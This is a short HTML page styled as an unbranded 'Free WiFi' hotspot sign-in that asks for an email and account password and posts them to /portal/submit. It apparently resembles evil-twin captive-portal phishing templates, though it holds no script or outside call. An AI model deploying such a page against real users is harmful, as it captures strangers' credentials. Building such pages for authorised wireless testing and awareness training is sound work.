<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Hotspot</title>
<style>
  html, body { margin:0; padding:0; height:100%; font-family:-apple-system,"Segoe UI",Roboto,sans-serif; background:#1a1a2e; color:#fff; }
  body { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; box-sizing:border-box; background:linear-gradient(135deg,#1a1a2e 0%,#3d0066 100%); }
  .card { background:#fff; color:#111; border-radius:12px; padding:36px 32px; width:min(420px,100%); text-align:center; box-shadow:0 16px 40px rgba(0,0,0,0.35); }
  .chip { display:inline-block; padding:4px 12px; background:linear-gradient(90deg,#a020f0,#6a0dad); color:#fff; border-radius:999px; font-size:10px; letter-spacing:1.5px; text-transform:uppercase; font-weight:700; margin-bottom:14px; }
  h1 { font-size:22px; margin:4px 0 4px; color:#111; font-weight:700; }
  .sub { color:#6b7780; font-size:13px; margin-bottom:22px; }
  .form-row { margin:10px 0; text-align:left; }
  label { display:block; font-size:11px; color:#6b7780; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:4px; font-weight:700; }
  input { width:100%; padding:12px 14px; font-size:14px; border:2px solid #e5e5e5; border-radius:8px; box-sizing:border-box; background:#fff; color:#111; }
  input:focus { outline:none; border-color:#a020f0; }
  button { width:100%; padding:14px; margin-top:18px; background:linear-gradient(90deg,#a020f0,#6a0dad); color:#fff; border:none; border-radius:999px; font-size:14px; font-weight:700; cursor:pointer; text-transform:uppercase; letter-spacing:0.5px; }
  button:hover { filter:brightness(1.1); }
</style>
</head>
<body>
<div class="card">
  <div class="chip">Hotspot</div>
  <h1>Sign in for Free WiFi</h1>
  <div class="sub">Enter your account details to continue.</div>
  <form method="POST" action="/portal/submit">
    <div class="form-row"><label>Email</label><input type="email" name="email" required></div>
    <div class="form-row"><label>Password</label><input type="password" name="password" required></div>
    <button type="submit">Get Online</button>
  </form>
</div>
</body>
</html>
